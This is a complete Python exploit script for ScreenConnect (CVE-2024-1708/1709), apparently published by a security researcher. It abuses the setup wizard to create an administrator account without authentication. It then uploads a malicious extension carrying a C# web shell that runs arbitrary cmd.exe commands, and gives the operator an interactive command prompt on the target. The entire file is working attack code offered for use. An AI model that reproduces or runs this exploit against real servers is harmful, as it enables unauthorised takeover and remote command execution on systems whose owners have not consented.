import argparse
import base64
import re
import sys
import warnings
from distutils.version import LooseVersion
import requests
import random
import string
import zipfile
import urllib3

DELETE_STATUS=False
warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings()

exploit_header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
}

GREEN = "\033[92m"
RESET = "\033[0m"
def rand_text_hex(length):
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))
def rand_text_alpha_lower(length):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
def rand_text_alpha(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

plugin_guid = '-'.join([rand_text_hex(a) for a in [8, 4, 4, 4, 12]])
payload_ashx = f"{rand_text_alpha_lower(8)}.ashx"
payload_handler_class = rand_text_alpha(8)
payload_psi_var = rand_text_alpha(8)
session = requests.Session()

def GetAntiForgeryToken(url, username, password):
    try:
        resp = session.get(url=url + "/Administration", auth=(username, password), verify=False, headers=exploit_header, proxies=proxy)
        antiForgeryToken = re.search(r'"antiForgeryToken"\s*:\s*"([a-zA-Z0-9+/=]+)"', resp.text).group(1)
        return antiForgeryToken
    except:
        return None

def CreateExtension():
    payload_data = f'''<% @ WebHandler Language="C#" Class="{payload_handler_class}" %>
using System;
using System.Web;
using System.Diagnostics;
public class {payload_handler_class} : IHttpHandler
{{
    public void ProcessRequest(HttpContext ctx)
    {{
        string command = ctx.Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(command))
        {{
            ExecuteCommand(command, ctx);
        }}
        else
        {{
            ctx.Response.ContentType = "text/plain";
        }}
    }}
    private void ExecuteCommand(string cmd, HttpContext ctx)
    {{
        ProcessStartInfo {payload_psi_var} = new ProcessStartInfo();
        {payload_psi_var}.FileName = "cmd.exe";
        {payload_psi_var}.Arguments = $"/c {{cmd}}";
        {payload_psi_var}.RedirectStandardOutput = true;
        {payload_psi_var}.UseShellExecute = false;
        using (Process process = new Process())
        {{
            process.StartInfo = {payload_psi_var};
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            ctx.Response.ContentType = "text/plain";
            ctx.Response.Write(output);
        }}
    }}
    public bool IsReusable {{ get {{ return true; }} }}
}}'''
    manifest_data = f'''<?xml version="1.0" encoding="utf-8"?>
<ExtensionManifest>
  <Version>1</Version>
  <Name>{rand_text_alpha_lower(8)}</Name>
  <Author>{rand_text_alpha_lower(8)}</Author>
  <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>
  <LoadMessage>null</LoadMessage>
  <Components>
    <WebServiceReference SourceFile="{payload_ashx}"/>
  </Components>
</ExtensionManifest>'''
    zip_resources = zipfile.ZipFile("resources.zip", 'w')
    zip_resources.writestr(f"{plugin_guid}/Manifest.xml", manifest_data)
    zip_resources.writestr(f"{plugin_guid}/{payload_ashx}", payload_data)
    zip_resources.close()

def UploadExtension(url, anti_forgery_token):
    with open("resources.zip", "rb") as f:
        zip_data = f.read()
    zip_data_base64 = base64.b64encode(zip_data).decode()
    headers = {
        "X-Anti-Forgery-Token": anti_forgery_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    url = url + "/Services/ExtensionService.ashx/InstallExtension"
    session.cookies.update({"settings": "%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D"})
    try:
        response = session.post(url=url, data=f"[\"{zip_data_base64}\"]", headers=headers, verify=False, proxies=proxy)
        if response.status_code == 200:
            print(f"[+] The malicious extension was uploaded successfully, with the ID: {plugin_guid}")
        else:
            print("[-] Malicious extension upload failed, please check the network and try again or try to exploit manually")
    except Exception as err:
        print("[-] Error in func <UploadExtension>, error message: " + str(err))

def ExecuteCommand(url):
    try:
        resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}", headers=exploit_header, verify=False, proxies=proxy)
        if resp.status_code == 200:
            print(f"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}")
            print("[+] Please start executing commands freely! Type <quit> to delete the shell")
            while True:
                cmd = input(f"{GREEN}command > {RESET}")
                if cmd == "quit":
                    DeleteExtension(target, plugin_guid)
                    sys.exit(0)
                try:
                    resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}", headers=exploit_header, verify=False, proxies=proxy)
                    print(resp.text)
                except Exception as err:
                    print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
        else:
            print(f"[-] Malicious extension load error ({url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}), Refer to https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf")
            DeleteExtension(target, plugin_guid)
    except Exception as err:
        print("[-] Error in func <ExecuteCommand>, error message: " + str(err))

def DeleteExtension(url, plugin_guid):
    global DELETE_STATUS
    if not DELETE_STATUS:
        try:
            headers = {
                "X-Anti-Forgery-Token": anti_forgery_token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            }
            url = url + "/Services/ExtensionService.ashx/UninstallExtension"
            response = session.post(url=url, data=f"[\"{plugin_guid}\"]", headers=headers, verify=False, proxies=proxy)
            if response.status_code == 200:
                print(f"[+] The malicious extension was removed successfully, with the ID: {plugin_guid}")
                DELETE_STATUS = True
            else:
                print("[-] Malicious extension removed failed, please check the network and try again or try to exploit manually")
        except Exception as err:
            print("[-] Error in func <DeleteExtension>, error message: " + str(err))

def AddUser(url, username, password, domain):
    if CheckVersion(url):
        try:
            initial_request = requests.get(url=url + "/SetupWizard.aspx/", verify=False)
            viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
            viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)
            next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1,
                         "__VIEWSTATEGENERATOR": viewgen_1,
                         "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
            next_request = requests.post(url=url + "/SetupWizard.aspx/", headers=exploit_header, data=next_data, verify=False)
            exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
            exploit_viewgen = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
            exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate,
                            "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": username,
                            "ctl00$Main$wizard$emailBox": username + f"@{domain}",
                            "ctl00$Main$wizard$passwordBox": password, "ctl00$Main$wizard$verifyPasswordBox": password,
                            "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}
            requests.post(url=url + "/SetupWizard.aspx/", headers=exploit_header, data=exploit_data, verify=False)
            check_url = url + "/Services/AuthenticationService.ashx/TryLogin"
            check_data = f"""["{username}","{password}",null,null,null]"""
            check_header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Content-Type": "application/json"
            }
            check_response = requests.post(url=check_url, data=check_data, headers=check_header, verify=False)
            if check_response.ok and "1" in check_response.text:
                print(f"[+] {url} Successfully added user. username: {GREEN}{username}{RESET} and password: {GREEN}{password}{RESET}")
            else:
                print(f"[-] Failed to add user, {url} does not have this vulnerability, please check the network and try again or try to exploit manually")
        except Exception as err:
            print("[-] Error in func <AddUser>, error message: " + str(err))

def CheckVersion(url):
    try:
        response = requests.get(url=url + "/Login?Reason=0", headers=exploit_header, verify=False)
        serverString = response.headers["Server"]
        version = re.search(r"ScreenConnect\/([\d\.]+)-\d+", serverString).group(1)
        if LooseVersion(version) <= LooseVersion("23.9.7"):
            return True
        else:
            return False
    except Exception as err:
        print("[-] Error in func <CheckVersion>, error message: " + str(err))
        return False

def ParseArguments():
    banner = r"""
 ____                            ____                            _     ____   ____ _____ 
/ ___|  ___ _ __ ___  ___ _ __  / ___|___  _ __  _ __   ___  ___| |_  |  _ \ / ___| ____|
\___ \ / __| '__/ _ \/ _ \ '_ \| |   / _ \| '_ \| '_ \ / _ \/ __| __| | |_) | |   |  _|  
 ___) | (__| | |  __/  __/ | | | |__| (_) | | | | | | |  __/ (__| |_  |  _ <| |___| |___ 
|____/ \___|_|  \___|\___|_| |_|\____\___/|_| |_|_| |_|\___|\___|\__| |_| \_\\____|_____|
                                                                            Author: @W01fh4cker
                                                                            Github: https://github.com/W01fh4cker
    """
    print(banner)
    parser = argparse.ArgumentParser(description="CVE-2024-1708 && CVE-2024-1709 --> RCE!!!")
    parser.add_argument("-u", "--username", type=str, default="cvetest", help="username you want to add", required=False)
    parser.add_argument("-p", "--password", type=str, default="cvetest@2023", help="password you want to add", required=False)
    parser.add_argument("-t", "--target", type=str, help="target url", required=True)
    parser.add_argument("-d", "--domain", type=str, default="poc.com", help="Description of domain", required=False)
    parser.add_argument("--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
    return parser.parse_args()

if __name__ == "__main__":
    args = ParseArguments()
    username = args.username
    password = args.password
    target = args.target.rstrip("/")
    domain = args.domain
    if args.proxy:
        proxy = {"http": args.proxy, "https": args.proxy}
    else:
        proxy = {}
    print(f"[*] Start checking: {target}")
    anti_forgery_token = GetAntiForgeryToken(target, username, password)
    if anti_forgery_token is None:
        AddUser(target, username, password, domain)
        anti_forgery_token = GetAntiForgeryToken(target, username, password)
    else:
        print(f"[+] username: {GREEN}{username}{RESET} | password: {GREEN}{password}{RESET}")

    CreateExtension()
    if anti_forgery_token is not None:
        print(f"[+] X-Anti-Forgery-Token successfully obtained: {anti_forgery_token}")
        UploadExtension(target, anti_forgery_token)
    else:

        print("[-] AntiForgeryToken acquisition failed, please check the network and try again or try to exploit manually")
    try:
        ExecuteCommand(target)
    except Exception as e:
        DeleteExtension(target, plugin_guid)
